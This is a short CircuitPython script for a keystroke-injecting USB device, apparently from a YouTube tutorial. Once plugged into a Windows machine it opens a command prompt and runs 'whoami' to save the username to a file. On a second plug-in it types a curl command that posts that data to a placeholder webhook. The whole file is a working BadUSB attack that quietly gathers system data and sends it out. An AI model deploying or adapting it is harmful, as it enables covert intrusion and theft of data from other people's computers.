# youtube.com/technotebook
import time
import os
import usb_hid
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS


time.sleep(1.5)
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)


try:
    info = open("info.txt").read()
except:
    pass

if "info.txt" in os.listdir():
    time.sleep(0.1)
    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.1)

    layout.write("cmd\n")

    time.sleep(0.2)

    layout.write(r'curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"')
    time.sleep(0.1)

    layout.write(info)
    time.sleep(0.1)

    layout.write(r'\"}" WEBHOOK HERE')
    time.sleep(0.2)
    layout.write("\n")
    time.sleep(1.5)

    layout.write("exit\n")
else:
    keyboard.send(Keycode.WINDOWS, Keycode.R)
    time.sleep(0.1)

    layout.write("cmd\n")

    time.sleep(0.2)

    layout.write("cd F:\ \n")
    time.sleep(0.05)

    layout.write("whoami > F:\info.txt\n")
    time.sleep(1)